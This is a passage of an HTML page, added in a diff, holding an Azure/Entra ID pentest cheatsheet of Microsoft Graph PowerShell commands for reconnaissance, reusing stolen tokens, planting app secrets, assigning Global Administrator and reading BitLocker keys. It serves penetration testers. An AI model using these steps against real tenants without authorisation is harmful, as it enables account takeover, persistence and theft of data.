@@ -1,0 +1,2675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Azure / Entra ID Pentest Cheatsheets</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --bg2: #161b22;
+    --bg3: #21262d;
+    --border: #30363d;
+    --text: #e6edf3;
+    --text2: #8b949e;
+    --text3: #6e7681;
+    --accent: #58a6ff;
+    --accent2: #1f6feb;
+    --green: #3fb950;
+    --yellow: #d29922;
+    --orange: #db6d28;
+    --red: #f85149;
+    --purple: #bc8cff;
+    --cyan: #39d353;
+    --code-bg: #161b22;
+    --code-border: #30363d;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    font-size: 14px;
+    line-height: 1.6;
+    min-height: 100vh;
+  }
+
+  /* ── Header ── */
+  header {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 14px 20px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+  header h1 {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--text);
+    white-space: nowrap;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  header h1 span.icon { font-size: 18px; }
+  .search-wrap {
+    flex: 1;
+    position: relative;
+  }
+  #search {
+    width: 100%;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 6px 12px 6px 34px;
+    color: var(--text);
+    font-size: 13px;
+    outline: none;
+    transition: border-color 0.15s;
+  }
+  #search:focus { border-color: var(--accent2); }
+  #search::placeholder { color: var(--text3); }
+  .search-icon {
+    position: absolute;
+    left: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: var(--text3);
+    font-size: 13px;
+    pointer-events: none;
+  }
+  #search-count {
+    font-size: 12px;
+    color: var(--text2);
+    white-space: nowrap;
+  }
+  #dl-btn {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text2);
+    font-size: 12px;
+    padding: 5px 12px;
+    border-radius: 6px;
+    cursor: pointer;
+    white-space: nowrap;
+    transition: background 0.15s, color 0.15s, border-color 0.15s;
+  }
+  #dl-btn:hover { background: var(--accent2); color: #fff; border-color: var(--accent2); }
+
+  /* ── Layout ── */
+  .layout { display: flex; height: calc(100vh - 53px); }
+
+  /* ── Sidebar ── */
+  .sidebar {
+    width: 220px;
+    min-width: 220px;
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    overflow-y: auto;
+    padding: 12px 0;
+  }
+  .sidebar-section {
+    padding: 0 8px 8px;
+  }
+  .sidebar-label {
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--text3);
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    padding: 4px 8px;
+    margin-bottom: 2px;
+  }
+  .tab-btn {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    width: 100%;
+    background: none;
+    border: none;
+    color: var(--text2);
+    text-align: left;
+    padding: 7px 10px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 13px;
+    transition: background 0.1s, color 0.1s;
+  }
+  .tab-btn:hover { background: var(--bg3); color: var(--text); }
+  .tab-btn.active { background: var(--accent2); color: #fff; font-weight: 500; }
+  .tab-btn .badge {
+    margin-left: auto;
+    font-size: 10px;
+    background: var(--bg3);
+    color: var(--text3);
+    padding: 1px 6px;
+    border-radius: 10px;
+    min-width: 20px;
+    text-align: center;
+  }
+  .tab-btn.active .badge { background: rgba(255,255,255,0.2); color: #fff; }
+
+  /* Section nav inside sidebar */
+  .section-list { padding: 4px 0 0; }
+  .sec-btn {
+    display: block;
+    width: 100%;
+    background: none;
+    border: none;
+    color: var(--text3);
+    text-align: left;
+    padding: 4px 10px 4px 26px;
+    font-size: 12px;
+    cursor: pointer;
+    border-radius: 4px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    transition: color 0.1s;
+  }
+  .sec-btn:hover { color: var(--accent); }
+
+  /* ── Main Content ── */
+  .main {
+    flex: 1;
+    overflow-y: auto;
+    padding: 24px 28px;
+  }
+  .tab-panel { display: none; }
+  .tab-panel.active { display: block; }
+
+  /* ── Markdown rendering ── */
+  .md h1 {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text);
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 10px;
+    margin-bottom: 20px;
+  }
+  .md h2 {
+    font-size: 17px;
+    font-weight: 600;
+    color: var(--text);
+    margin: 32px 0 12px;
+    padding-bottom: 6px;
+    border-bottom: 1px solid var(--border);
+    scroll-margin-top: 20px;
+  }
+  .md h3 {
+    font-size: 14px;
+    font-weight: 600;
+    color: var(--accent);
+    margin: 20px 0 8px;
+    scroll-margin-top: 20px;
+  }
+  .md p { margin-bottom: 10px; color: var(--text); }
+  .md hr { border: none; border-top: 1px solid var(--border); margin: 16px 0; }
+
+  .md pre {
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    border-radius: 8px;
+    padding: 14px 16px;
+    overflow-x: auto;
+    margin: 10px 0 16px;
+    position: relative;
+  }
+  .md code {
+    font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+    font-size: 12.5px;
+    color: var(--text);
+    background: none;
+    white-space: pre;
+  }
+  .md p code, .md li code, .md td code {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 1px 6px;
+    font-size: 12px;
+    color: #f0883e;
+  }
+
+  /* Copy button */
+  .copy-btn {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text2);
+    font-size: 11px;
+    padding: 3px 8px;
+    border-radius: 4px;
+    cursor: pointer;
+    opacity: 0;
+    transition: opacity 0.15s, background 0.15s;
+  }
+  .md pre:hover .copy-btn { opacity: 1; }
+  .copy-btn:hover { background: var(--accent2); color: #fff; border-color: var(--accent2); }
+  .copy-btn.copied { background: var(--green); color: #000; border-color: var(--green); opacity: 1; }
+
+  /* Language label */
+  .lang-label {
+    position: absolute;
+    top: 8px;
+    left: 12px;
+    font-size: 10px;
+    color: var(--text3);
+    font-family: monospace;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+  .md pre { padding-top: 28px; }
+
+  /* Tables */
+  .md table {
+    border-collapse: collapse;
+    width: 100%;
+    margin: 12px 0 20px;
+    font-size: 13px;
+  }
+  .md th {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 8px 12px;
+    text-align: left;
+    color: var(--text2);
+    font-weight: 600;
+    font-size: 12px;
+  }
+  .md td {
+    border: 1px solid var(--border);
+    padding: 7px 12px;
+    color: var(--text);
+  }
+  .md tr:nth-child(even) td { background: rgba(255,255,255,0.02); }
+  .md tr:hover td { background: rgba(88,166,255,0.05); }
+
+  /* Lists */
+  .md ul, .md ol { padding-left: 22px; margin-bottom: 10px; }
+  .md li { margin-bottom: 3px; }
+
+  /* Syntax highlighting */
+  .kw { color: #ff7b72; }   /* keywords */
+  .fn { color: #d2a8ff; }   /* functions/cmdlets */
+  .str { color: #a5d6ff; }  /* strings */
+  .cm { color: #6e7681; font-style: italic; } /* comments */
+  .var { color: #ffa657; }  /* variables */
+  .flag { color: #79c0ff; } /* flags/options */
+  .op { color: #ff7b72; }   /* operators */
+
+  /* Search highlighting */
+  mark {
+    background: #f0e68c;
+    color: #000;
+    border-radius: 2px;
+    padding: 0 1px;
+  }
+
+  /* Search results */
+  .no-results {
+    text-align: center;
+    padding: 60px 20px;
+    color: var(--text3);
+  }
+  .no-results .icon { font-size: 36px; margin-bottom: 12px; }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--bg3); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--border); }
+</style>
+</head>
+<body>
+
+<header>
+  <h1><span class="icon">☁️</span> Azure / Entra ID Pentest Cheatsheets</h1>
+  <div class="search-wrap">
+    <span class="search-icon">🔍</span>
+    <input id="search" type="text" placeholder="Search commands, flags, concepts...">
+  </div>
+  <span id="search-count"></span>
+  <button id="dl-btn" onclick="downloadCurrent()" title="Download current tab as .md">⬇ Download</button>
+</header>
+
+<div class="layout">
+  <nav class="sidebar" id="sidebar">
+    <div class="sidebar-section">
+      <div class="sidebar-label">Tools</div>
+      <button class="tab-btn active" onclick="switchTab('mgraph')" id="btn-mgraph">
+        <span>📊</span> MGGraph (PS)
+        <span class="badge" id="badge-mgraph">PS</span>
+      </button>
+      <button class="tab-btn" onclick="switchTab('azcli')" id="btn-azcli">
+        <span>⚡</span> Az CLI
+        <span class="badge" id="badge-azcli">CLI</span>
+      </button>
+      <button class="tab-btn" onclick="switchTab('aadinternals')" id="btn-aadinternals">
+        <span>🔓</span> AADInternals
+        <span class="badge" id="badge-aadinternals">PS</span>
+      </button>
+      <button class="tab-btn" onclick="switchTab('misc')" id="btn-misc">
+        <span>🧰</span> Misc Tools
+        <span class="badge" id="badge-misc">+6</span>
+      </button>
+    </div>
+    <div class="sidebar-section" id="section-nav"></div>
+  </nav>
+
+  <main class="main" id="main-content">
+    <div id="panel-mgraph" class="tab-panel active md"></div>
+    <div id="panel-azcli" class="tab-panel md"></div>
+    <div id="panel-aadinternals" class="tab-panel md"></div>
+    <div id="panel-misc" class="tab-panel md"></div>
+  </main>
+</div>
+
+<script>
+// ── Raw Markdown Content ─────────────────────────────────────────────────────
+
+const CONTENT = {};
+
+CONTENT.mgraph = `# Microsoft Graph PowerShell (MGGraph) Cheatsheet
+
+---
+
+## Installation & Setup
+
+\`\`\`powershell
+# Install the full SDK
+Install-Module Microsoft.Graph -Scope CurrentUser -Force
+
+# Install only specific sub-modules (faster)
+Install-Module Microsoft.Graph.Authentication -Scope CurrentUser
+Install-Module Microsoft.Graph.Users -Scope CurrentUser
+Install-Module Microsoft.Graph.Groups -Scope CurrentUser
+Install-Module Microsoft.Graph.Identity.DirectoryManagement -Scope CurrentUser
+Install-Module Microsoft.Graph.Applications -Scope CurrentUser
+Install-Module Microsoft.Graph.Identity.SignIns -Scope CurrentUser
+Install-Module Microsoft.Graph.DeviceManagement -Scope CurrentUser
+Install-Module Microsoft.Graph.Reports -Scope CurrentUser
+
+# Update
+Update-Module Microsoft.Graph
+
+# Check version
+Get-Module Microsoft.Graph* -ListAvailable | Select Name, Version
+
+# List all available commands
+Get-Command -Module Microsoft.Graph* | Measure-Object
+Get-Command -Module Microsoft.Graph* | Where-Object Name -like "*User*"
+\`\`\`
+
+---
+
+## Authentication
+
+\`\`\`powershell
+# Interactive login (browser pop-up)
+Connect-MgGraph
+
+# With specific scopes
+Connect-MgGraph -Scopes "User.Read.All","Group.Read.All","Directory.Read.All"
+
+# With tenant ID (useful for guest/MSP scenarios)
+Connect-MgGraph -TenantId "tenant.onmicrosoft.com"
+
+# Device code flow (no browser on current machine)
+Connect-MgGraph -UseDeviceCode
+
+# Client credentials (app registration secret)
+$ClientSecretCredential = [System.Net.NetworkCredential]::new("", "YOUR_SECRET")
+Connect-MgGraph -ClientId "APP_ID" -TenantId "TENANT_ID" -ClientSecretCredential $ClientSecretCredential
+
+# Client credentials via PSCredential object (alternative form)
+$SecureClientSecret = ConvertTo-SecureString -String "YOUR_SECRET" -AsPlainText -Force
+$ClientSecretCredential = New-Object System.Management.Automation.PSCredential("APP_ID", $SecureClientSecret)
+Connect-MgGraph -TenantId "TENANT_ID" -ClientSecretCredential $ClientSecretCredential
+
+# Certificate-based auth
+Connect-MgGraph -ClientId "APP_ID" -TenantId "TENANT_ID" -CertificateThumbprint "THUMBPRINT"
+
+# Using existing access token (stolen token)
+Connect-MgGraph -AccessToken (ConvertTo-SecureString "eyJ0eXAi..." -AsPlainText -Force)
+
+# Reuse token from active az CLI session
+Connect-MgGraph -AccessToken (ConvertTo-SecureString -String (az account get-access-token --resource "https://graph.microsoft.com" --query accessToken -o tsv) -AsPlainText -Force)
+
+# Managed Identity (from Azure VM/Function)
+Connect-MgGraph -Identity
+Connect-MgGraph -Identity -ClientId "USER_ASSIGNED_MI_CLIENT_ID"
+
+# Check current connection context
+Get-MgContext
+
+# Disconnect
+Disconnect-MgGraph
+\`\`\`
+
+### Common Permission Scopes
+
+| Scope | What it enables |
+|-------|----------------|
+| \`User.Read.All\` | Read all users |
+| \`User.ReadWrite.All\` | Modify all users |
+| \`Group.Read.All\` | Read all groups |
+| \`Group.ReadWrite.All\` | Modify groups/membership |
+| \`Directory.Read.All\` | Read all directory objects |
+| \`Directory.ReadWrite.All\` | Full directory write |
+| \`RoleManagement.Read.Directory\` | Read role assignments |
+| \`RoleManagement.ReadWrite.Directory\` | Assign/remove roles |
+| \`Application.Read.All\` | Read apps & service principals |
+| \`Application.ReadWrite.All\` | Modify apps, add secrets/certs |
+| \`AppRoleAssignment.ReadWrite.All\` | Grant app roles |
+| \`Policy.Read.All\` | Read CA policies |
+| \`Policy.ReadWrite.ConditionalAccess\` | Modify CA policies |
+| \`AuditLog.Read.All\` | Read audit/sign-in logs |
+| \`Mail.ReadWrite\` | Read/write mailboxes |
+| \`Mail.Send\` | Send email as user |
+| \`Files.ReadWrite.All\` | Access all SharePoint/OneDrive |
+| \`DeviceManagementManagedDevices.ReadWrite.All\` | Intune device control |
+
+---
+
+## Tenant & Organization Info
+
+\`\`\`powershell
+# Tenant details
+Get-MgOrganization | Select DisplayName, Id, TenantType, VerifiedDomains
+
+# Verified domains
+(Get-MgOrganization).VerifiedDomains
+
+# Tenant ID
+(Get-MgContext).TenantId
+
+# Organization contacts (external)
+Get-MgContact | Select DisplayName, Mail, ProxyAddresses
+
+# Subscribed SKUs (licenses)
+Get-MgSubscribedSku | Select SkuPartNumber, ConsumedUnits, @{N="Total";E={$_.PrepaidUnits.Enabled}}
+
+# Directory settings
+Get-MgDirectorySetting | ConvertTo-Json
+\`\`\`
+
+---
+
+## Users
+
+\`\`\`powershell
+# List all users
+Get-MgUser -All
+
+# Specific properties
+Get-MgUser -All | Select DisplayName, UserPrincipalName, Id, AccountEnabled, CreatedDateTime, LastPasswordChangeDateTime
+
+# Search by UPN or display name
+Get-MgUser -Filter "userPrincipalName eq 'user@domain.com'"
+Get-MgUser -Filter "startsWith(displayName,'John')"
+Get-MgUser -Search '"displayName:admin"' -ConsistencyLevel eventual
+
+# Get single user by ID or UPN
+Get-MgUser -UserId "user@domain.com"
+Get-MgUser -UserId "OBJECT-ID"
+
+# All properties for a user
+Get-MgUser -UserId "user@domain.com" -Property *
+
+# Guest users only
+Get-MgUser -Filter "userType eq 'Guest'" -All
+
+# Disabled accounts
+Get-MgUser -Filter "accountEnabled eq false" -All
+
+# High value targets
+Get-MgUser -Filter "startsWith(userPrincipalName,'admin')" -All
+Get-MgUser -All | Where-Object { $_.DisplayName -match "admin|svc|service|sysadmin|root" }
+
+# Users created recently
+Get-MgUser -All | Where-Object { $_.CreatedDateTime -gt (Get-Date).AddDays(-30) }
+
+# User's assigned licenses
+Get-MgUserLicenseDetail -UserId "user@domain.com"
+
+# User's manager
+Get-MgUserManager -UserId "user@domain.com"
+
+# User's direct reports
+Get-MgUserDirectReport -UserId "user@domain.com"
+
+# User's owned objects (apps, groups)
+Get-MgUserOwnedObject -UserId "user@domain.com"
+
+# User's registered devices
+Get-MgUserRegisteredDevice -UserId "user@domain.com"
+
+# User's OAuth2 permission grants (consented apps)
+Get-MgUserOauth2PermissionGrant -UserId "user@domain.com"
+
+# User's app role assignments
+Get-MgUserAppRoleAssignment -UserId "user@domain.com"
+
+# Create user
+$PasswordProfile = @{ Password = "P@ssw0rd123!"; ForceChangePasswordNextSignIn = $false }
+New-MgUser -DisplayName "Test User" -UserPrincipalName "testuser@domain.com" \`
+  -AccountEnabled $true -PasswordProfile $PasswordProfile -MailNickname "testuser"
+
+# Update user / reset password
+Update-MgUser -UserId "user@domain.com" -PasswordProfile @{ Password = "NewP@ss123!" }
+
+# Enable/disable user
+Update-MgUser -UserId "user@domain.com" -AccountEnabled $false
+Update-MgUser -UserId "user@domain.com" -AccountEnabled $true
+
+# Delete user
+Remove-MgUser -UserId "user@domain.com"
+
+# Restore deleted user (within 30 days)
+Restore-MgDirectoryDeletedItem -DirectoryObjectId "OBJECT-ID"
+
+# Permanently delete
+Remove-MgDirectoryDeletedItem -DirectoryObjectId "OBJECT-ID"
+\`\`\`
+
+---
+
+## Groups
+
+\`\`\`powershell
+# All groups
+Get-MgGroup -All
+
+# Filter by type
+Get-MgGroup -Filter "groupTypes/any(c:c eq 'Unified')" -All   # M365 groups
+Get-MgGroup -Filter "securityEnabled eq true" -All            # Security groups
+Get-MgGroup -Filter "mailEnabled eq true" -All                # Mail-enabled
+
+# Search
+Get-MgGroup -Search '"displayName:IT"' -ConsistencyLevel eventual
+
+# Group members
+Get-MgGroupMember -GroupId "GROUP-ID" -All
+Get-MgGroupMember -GroupId "GROUP-ID" -All | ForEach-Object {
+    Get-MgUser -UserId $_.Id -ErrorAction SilentlyContinue
+} | Select DisplayName, UserPrincipalName
+
+# Transitive members (includes nested group members)
+Get-MgGroupTransitiveMember -GroupId "GROUP-ID" -All
+
+# Group owners
+Get-MgGroupOwner -GroupId "GROUP-ID"
+
+# Groups a user is member of
+Get-MgUserMemberOf -UserId "user@domain.com" | Select DisplayName, Id
+
+# Transitive group membership
+Get-MgUserTransitiveMemberOf -UserId "user@domain.com"
+
+# Add member to group
+New-MgGroupMember -GroupId "GROUP-ID" -DirectoryObjectId "USER-OBJECT-ID"
+
+# Remove member
+Remove-MgGroupMemberByRef -GroupId "GROUP-ID" -DirectoryObjectId "USER-OBJECT-ID"
+
+# Add owner
+New-MgGroupOwner -GroupId "GROUP-ID" -DirectoryObjectId "USER-OBJECT-ID"
+
+# Create group
+New-MgGroup -DisplayName "NewGroup" -MailEnabled $false -SecurityEnabled $true -MailNickname "NewGroup"
+
+# Delete group
+Remove-MgGroup -GroupId "GROUP-ID"
+
+# Get group's app role assignments
+Get-MgGroupAppRoleAssignment -GroupId "GROUP-ID"
+\`\`\`
+
+---
+
+## Directory Roles (Entra ID Roles)
+
+\`\`\`powershell
+# List all built-in role templates
+Get-MgDirectoryRoleTemplate | Select DisplayName, Id, Description | Sort DisplayName
+
+# List active (instantiated) roles
+Get-MgDirectoryRole -All | Select DisplayName, Id, Description
+
+# Get members of a specific role
+$role = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
+Get-MgDirectoryRoleMember -DirectoryRoleId $role.Id | ForEach-Object {
+    Get-MgUser -UserId $_.Id -ErrorAction SilentlyContinue
+} | Select DisplayName, UserPrincipalName, Id
+
+# List members of ALL privileged roles
+$privRoles = @("Global Administrator","Privileged Role Administrator","Security Administrator",
+               "Exchange Administrator","SharePoint Administrator","Hybrid Identity Administrator",
+               "Application Administrator","Cloud Application Administrator","User Administrator",
+               "Authentication Administrator","Password Administrator","Global Reader")
+
+foreach ($roleName in $privRoles) {
+    $role = Get-MgDirectoryRole -Filter "displayName eq '$roleName'" -ErrorAction SilentlyContinue
+    if ($role) {
+        $members = Get-MgDirectoryRoleMember -DirectoryRoleId $role.Id -All
+        if ($members) {
+            Write-Host "\`n[+] $roleName" -ForegroundColor Cyan
+            $members | ForEach-Object {
+                Get-MgUser -UserId $_.Id -ErrorAction SilentlyContinue
+            } | Select DisplayName, UserPrincipalName | Format-Table
+        }
+    }
+}
+
+# Assign role to user
+$roleTemplate = Get-MgDirectoryRoleTemplate -Filter "displayName eq 'Global Administrator'"
+$role = New-MgDirectoryRole -RoleTemplateId $roleTemplate.Id
+New-MgDirectoryRoleMember -DirectoryRoleId $role.Id -DirectoryObjectId "USER-OBJECT-ID"
+
+# Remove role from user
+Remove-MgDirectoryRoleMemberByRef -DirectoryRoleId "ROLE-ID" -DirectoryObjectId "USER-OBJECT-ID"
+
+# Role-eligible assignments (PIM)
+Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq 'USER-OBJECT-ID'"
+Get-MgRoleManagementDirectoryRoleEligibilitySchedule -All
+
+# Active PIM assignments
+Get-MgRoleManagementDirectoryRoleAssignmentScheduleInstance -All
+
+# List directory roles assigned to a principal (user or group) — resolves role names
+Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq 'PRINCIPAL-ID'" | ForEach-Object {
+    $role = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId
+    Write-Host "$($role.DisplayName) -> Scope: $($_.DirectoryScopeId)"
+}
+
+# Assign Global Administrator (requires RoleManagement.ReadWrite.Directory)
+$userId = az ad user show --id "user@domain.com" --query id -o tsv
+$body = @{
+    principalId      = $userId
+    roleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"   # Global Administrator
+    directoryScopeId = "/"
+} | ConvertTo-Json
+$body | Out-File "$env:TEMP\roleassign.json" -Encoding utf8
+az rest --method POST \`
+  --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \`
+  --headers "Content-Type=application/json" \`
+  --body "@$env:TEMP\roleassign.json"
+\`\`\`
+
+---
+
+## Applications & Service Principals
+
+\`\`\`powershell
+# List all app registrations
+Get-MgApplication -All | Select DisplayName, AppId, Id, CreatedDateTime
+
+# List all service principals (enterprise apps)
+Get-MgServicePrincipal -All | Select DisplayName, AppId, Id, ServicePrincipalType
+
+# Get app by display name
+Get-MgApplication -Filter "displayName eq 'MyApp'"
+Get-MgServicePrincipal -Filter "displayName eq 'MyApp'"
+
+# Apps with credentials (secrets/certs)
+Get-MgApplication -All | Where-Object { $_.PasswordCredentials -or $_.KeyCredentials } |
+    Select DisplayName, AppId, @{N="Secrets";E={$_.PasswordCredentials.Count}}, @{N="Certs";E={$_.KeyCredentials.Count}}
+
+# Secret metadata
+$app = Get-MgApplication -Filter "displayName eq 'MyApp'"
+$app.PasswordCredentials | Select DisplayName, KeyId, StartDateTime, EndDateTime
+
+# Add a new secret to an app
+$app = Get-MgApplication -Filter "displayName eq 'TargetApp'"
+$secret = Add-MgApplicationPassword -ApplicationId $app.Id -PasswordCredential @{
+    DisplayName = "Backup Key"
+    EndDateTime = (Get-Date).AddYears(2)
+}
+Write-Host "NEW SECRET: $($secret.SecretText)"  # Only shown once!
+
+# Add secret to service principal
+$sp = Get-MgServicePrincipal -Filter "displayName eq 'TargetApp'"
+$secret = Add-MgServicePrincipalPassword -ServicePrincipalId $sp.Id -PasswordCredential @{
+    DisplayName = "Backup Key"
+    EndDateTime = (Get-Date).AddYears(2)
+}
+
+# Remove a secret
+Remove-MgApplicationPassword -ApplicationId "APP-OBJECT-ID" -KeyId "KEY-ID"
+
+# Add certificate to app
+$certBytes = [System.IO.File]::ReadAllBytes("C:\cert.cer")
+Update-MgApplication -ApplicationId "APP-OBJECT-ID" -KeyCredentials @{
+    Type = "AsymmetricX509Cert"; Usage = "Verify"; Key = $certBytes
+}
+
+# App owners
+Get-MgApplicationOwner -ApplicationId "APP-OBJECT-ID"
+
+# Add owner to app (escalation path)
+New-MgApplicationOwner -ApplicationId "APP-OBJECT-ID" -DirectoryObjectId "USER-OBJECT-ID"
+
+# Service principal owners
+Get-MgServicePrincipalOwner -ServicePrincipalId "SP-OBJECT-ID"
+
+# App permissions (app role assignments granted to SP)
+Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId "SP-OBJECT-ID"
+
+# OAuth2 permission grants (delegated permissions)
+Get-MgServicePrincipalOauth2PermissionGrant -ServicePrincipalId "SP-OBJECT-ID"
+
+# All OAuth2 grants in the tenant
+Get-MgOauth2PermissionGrant -All | Select ClientId, ConsentType, PrincipalId, Scope
+
+# Grant app role to service principal
+$graphSp = Get-MgServicePrincipal -Filter "displayName eq 'Microsoft Graph'"
+$appRole = $graphSp.AppRoles | Where-Object { $_.Value -eq "Mail.Read" }
+$targetSp = Get-MgServicePrincipal -Filter "displayName eq 'MyApp'"
+New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $targetSp.Id \`
+    -PrincipalId $targetSp.Id -ResourceId $graphSp.Id -AppRoleId $appRole.Id
+
+# Create new app registration
+$app = New-MgApplication -DisplayName "LegitApp" -SignInAudience "AzureADMyOrg"
+$sp = New-MgServicePrincipal -AppId $app.AppId
+
+# Delete app
+Remove-MgApplication -ApplicationId "APP-OBJECT-ID"
+\`\`\`
+
+---
+
+## Conditional Access Policies
+
+\`\`\`powershell
+# List all CA policies
+Get-MgIdentityConditionalAccessPolicy -All | Select DisplayName, State, Id
+
+# Detailed view
+Get-MgIdentityConditionalAccessPolicy -All | ConvertTo-Json -Depth 5
+
+# Policies in report-only (bypassable)
+Get-MgIdentityConditionalAccessPolicy -Filter "state eq 'enabledForReportingButNotEnforced'" -All
+
+# Named locations (IP ranges, countries)
+Get-MgIdentityConditionalAccessNamedLocation -All | ConvertTo-Json -Depth 5
+\`\`\`
+
+---
+
+## MFA / Authentication Methods
+
+\`\`\`powershell
+# Get registered auth methods for a user
+Get-MgUserAuthenticationMethod -UserId "user@domain.com"
+
+# Phone methods (SMS/voice)
+Get-MgUserAuthenticationPhoneMethod -UserId "user@domain.com"
+
+# Authenticator app methods
+Get-MgUserAuthenticationMicrosoftAuthenticatorMethod -UserId "user@domain.com"
+
+# FIDO2 keys
+Get-MgUserAuthenticationFido2Method -UserId "user@domain.com"
+
+# Temp Access Pass
+Get-MgUserAuthenticationTemporaryAccessPassMethod -UserId "user@domain.com"
+
+# Create Temp Access Pass
+New-MgUserAuthenticationTemporaryAccessPassMethod -UserId "user@domain.com" \`
+  -TemporaryAccessPassAuthenticationMethodBody @{ lifetimeInMinutes = 60; isUsableOnce = $false }
+
+# Delete an auth method
+Remove-MgUserAuthenticationPhoneMethod -UserId "user@domain.com" -PhoneAuthenticationMethodId "METHOD-ID"
+
+# Users with NO registered MFA methods
+$users = Get-MgUser -All
+foreach ($user in $users) {
+    $methods = Get-MgUserAuthenticationMethod -UserId $user.Id
+    if ($methods.Count -le 1) {
+        Write-Host "$($user.UserPrincipalName) - Possible no MFA"
+    }
+}
+\`\`\`
+
+---
+
+## Sign-In & Audit Logs
+
+\`\`\`powershell
+# Recent sign-in logs (requires AuditLog.Read.All)
+Get-MgAuditLogSignIn -Top 50 | Select UserPrincipalName, AppDisplayName, IPAddress, Status, CreatedDateTime
+
+# Filter by user
+Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'user@domain.com'" -Top 100
+
+# Failed sign-ins
+Get-MgAuditLogSignIn -Filter "status/errorCode ne 0" -Top 100 |
+    Select UserPrincipalName, IPAddress, @{N="Error";E={$_.Status.FailureReason}}, CreatedDateTime
+
+# Sign-ins from specific IP
+Get-MgAuditLogSignIn -Filter "ipAddress eq '1.2.3.4'" -Top 100
+
+# Sign-ins without MFA
+Get-MgAuditLogSignIn -Filter "authenticationRequirement eq 'singleFactorAuthentication'" -Top 100
+
+# Audit logs
+Get-MgAuditLogDirectoryAudit -Top 50 | Select ActivityDisplayName, Category, InitiatedBy, ActivityDateTime
+
+# Filter by activity
+Get-MgAuditLogDirectoryAudit -Filter "activityDisplayName eq 'Add member to role'" -Top 50
+
+# Recent password resets
+Get-MgAuditLogDirectoryAudit -Filter "activityDisplayName eq 'Reset password (by admin)'" -Top 50
+
+# App consents granted
+Get-MgAuditLogDirectoryAudit -Filter "activityDisplayName eq 'Consent to application'" -Top 50
+\`\`\`
+
+---
+
+## Devices
+
+\`\`\`powershell
+# All registered devices
+Get-MgDevice -All | Select DisplayName, DeviceId, OperatingSystem, IsManaged, IsCompliant, ApproximateLastSignInDateTime
+
+# Intune-managed devices
+Get-MgDevice -Filter "isManaged eq true" -All
+
+# Non-compliant devices
+Get-MgDevice -Filter "isCompliant eq false" -All
+
+# Stale devices (not seen in 90 days)
+$cutoff = (Get-Date).AddDays(-90).ToString("yyyy-MM-ddTHH:mm:ssZ")
+Get-MgDevice -Filter "approximateLastSignInDateTime le $cutoff" -All
+
+# Device owners
+Get-MgDeviceRegisteredOwner -DeviceId "DEVICE-ID"
+
+# Devices registered by user
+Get-MgUserRegisteredDevice -UserId "user@domain.com"
+
+# BitLocker recovery keys
+Get-MgInformationProtectionBitlockerRecoveryKey -All
+Get-MgInformationProtectionBitlockerRecoveryKey -BitlockerRecoveryKeyId "KEY-ID" -Property "key"
+\`\`\`
+
+---
+
+## Direct API Calls (Invoke-MgGraphRequest)
+
+\`\`\`powershell
+# Generic GET
+Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users"
+
+# Beta endpoint
+Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/users?\$select=displayName,userPrincipalName,onPremisesImmutableId"
+
+# POST (create)
+$body = @{ displayName = "NewGroup"; mailEnabled = $false; securityEnabled = $true; mailNickname = "newgroup" }
+Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/v1.0/groups" -Body $body
+
+# PATCH (update)
+Invoke-MgGraphRequest -Method PATCH -Uri "https://graph.microsoft.com/v1.0/users/USER-ID" -Body @{ accountEnabled = $false }
+
+# Delta query (track changes)
+Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users/delta"
+
+# Useful beta endpoints
+Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?\$expand=principal"
+Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/identity/conditionalAccess/policies"
+\`\`\`
+
+---
+
+## Recon One-Liners
+
+\`\`\`powershell
+# Full user dump to CSV
